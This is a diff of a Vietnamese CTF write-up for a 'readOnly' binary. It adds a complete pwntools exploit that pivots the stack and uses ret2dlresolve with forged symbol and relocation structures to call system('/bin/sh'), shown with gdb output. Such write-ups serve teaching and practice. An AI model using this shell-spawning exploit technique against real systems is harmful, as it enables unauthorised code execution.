@@ -1,3 +1,6 @@
+# Tham khảo
+[https://github.com/nhtri2003gmail/CTFWriteup](https://github.com/nhtri2003gmail/CTFWriteup)
+
 # Source C
 
 ```c
@@ -95,7 +98,7 @@ p.send(payload)
     st_name = STRTAB_addr - STRTAB
 ```
 
-- Với các `SYSTAB, JMPREL, STRTAB` có trong file, ta sẽ tìm [ở đây]()
+- Với các `SYSTAB, JMPREL, STRTAB` có trong file
 
 ```
 JMPREL =>   0x00000000004005b8 - 0x0000000000400600 is .rela.plt
@@ -113,6 +116,185 @@ STRTAB = 0x4004a8
 dlresolve = 0x401020
 ```
 
-- và tìm các addr theo điều kiện ở trên, và địa chỉ các addr phải ở trong vùng ghi được (chưa rõ có cần gần nhau không)
+- và tìm các addr theo điều kiện ở trên, và địa chỉ các addr phải ở trong vùng ghi được
 - tình hình là bây giờ chúng ta sẽ chọn addr, tuy nhiên base của ta chọn là `0x404a00` và payload được nhập là 0x100 kí tự nghĩa là ta sẽ chọn các số sao cho trong khoảng 0xa00 đến 0xb00
-- Kết quả của a Trí tính được
+- Kết quả của a Trí tính được là như này
+
+```python
+SYMTAB_addr = 0x404a50
+JMPREL_addr = 0x404a70
+STRTAB_addr = 0x404a90
+symbol_number = int((SYMTAB_addr - SYMTAB)/24)
+reloc_arg = int((JMPREL_addr - JMPREL)/24)
+st_name = STRTAB_addr - STRTAB
+```
+
+## SYMTAB_struct
+
+```python
+st_info = 0x12
+st_other = 0
+st_shndx = 0
+st_value = 0
+st_size = 0
+SYMTAB_struct = p32(st_name) \
+	+ p8(st_info) \
+	+ p8(st_other) \
+	+ p16(st_shndx) \
+	+ p64(st_value) \
+	+ p64(st_size)
+```
+
+## JMPREL_struct
+
+```python
+r_offset = 0x404b30               # địa chỉ ghi được là được
+r_info = (symbol_number << 32) | 7
+r_addend = 0
+JMPREL_struct = flat(r_offset, r_info, r_addend)
+```
+
+## get shell
+
+```python
+payload = flat(
+	b'A'*8, 0x000000000040101a,
+	pop_rsi_r15,
+	0,
+	0,
+	pop_rdi,
+	0x404a98,		# String /bin/sh
+	dlresolve,
+	reloc_arg,		# Reloc_arg
+	0,
+	SYMTAB_struct,
+	0,
+	JMPREL_struct,
+	0,
+	b'system\x00\x00',
+	b'/bin/sh\x00'
+	)
+p.send(payload)
+```
+
+- Ta cần dừng lại trước khi chạy dlresolve để kiểm tra
+  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/875ff03c-59f2-421a-9a90-07bfe1721fab)
+
+```
+gef➤  x/xg $rsp
+0x404a40:       0x00000000000002dd # reloc_arg (giống offset)
+
+gef➤  x/3xg 0x4005b8 + 0x2dd*24
+0x404a70:       0x0000000000404b30      0x000002f000000007
+0x404a80:       0x0000000000000000
+
+gef➤  x/3xg 0x4003d0+(0x000002f000000007>>32)*24
+0x404a50:       0x00000012000045e8      0x0000000000000000
+0x404a60:       0x0000000000000000
+
+gef➤  x/s 0x4004a8 + 0x45e8
+0x404a90:       "system"
+```
+
+![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/6ee69721-0bb7-45d4-90d3-b77b63d25f90)
+
+<details> <summary> full script </summary>
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+import subprocess
+
+context.binary = exe = ELF('./readOnly', checksec=False)
+context.log_level = 'info'
+
+p = process('./readOnly')
+gdb.attach(p, gdbscript = '''
+           b*main+34
+           b*vuln+36
+           c
+
+           ''')
+input()
+# p = remote('139.180.134.15', 7334)
+
+############################
+### Stage 1: Stack pivot ###
+############################
+pop_rdi = 0x0000000000401293
+pop_rsi_r15 = 0x0000000000401291
+leave_ret = 0x0000000000401208
+rw_section = 0x00000000404a00
+
+payload = b'A'*(56-8)
+payload += flat(
+	rw_section,
+	pop_rsi_r15,
+	rw_section,
+	0,
+	exe.plt['read'],
+	leave_ret
+	)
+payload = payload.ljust(0x100, b'P')
+p.send(payload)
+
+####################################################
+### Stage 2.1: Ret2dlresolve - Create structures ###
+####################################################
+# Set up structure
+JMPREL = 0x4005b8
+SYMTAB = 0x4003d0
+STRTAB = 0x4004a8
+dlresolve = 0x401020
+
+SYMTAB_addr = 0x404a50
+JMPREL_addr = 0x404a70
+STRTAB_addr = 0x404a90
+symbol_number = int((SYMTAB_addr - SYMTAB)/24)
+reloc_arg = int((JMPREL_addr - JMPREL)/24)
+st_name = STRTAB_addr - STRTAB
+
+st_info = 0x12
+st_other = 0
+st_shndx = 0
+st_value = 0
+st_size = 0
+SYMTAB_struct = p32(st_name) \
+	+ p8(st_info) \
+	+ p8(st_other) \
+	+ p16(st_shndx) \
+	+ p64(st_value) \
+	+ p64(st_size)
+
+r_offset = 0x404b30
+r_info = (symbol_number << 32) | 7
+r_addend = 0
+JMPREL_struct = flat(r_offset, r_info, r_addend)
+
+############################################
+### Stage 2.2: Ret2dlresolve - Get shell ###
+############################################
+payload = flat(
+	b'A'*8, 0x000000000040101a,
+	pop_rsi_r15,
+	0,
+	0,
+	pop_rdi,
+	0x404a98,		# String /bin/sh
+	dlresolve,
+	reloc_arg,		# Reloc_arg
+	0,
+	SYMTAB_struct,
+	0,
+	JMPREL_struct,
+	0,
+	b'system\x00\x00',
+	b'/bin/sh\x00'
+	)
+p.send(payload)
+
+p.interactive()
+```
+
+</details>
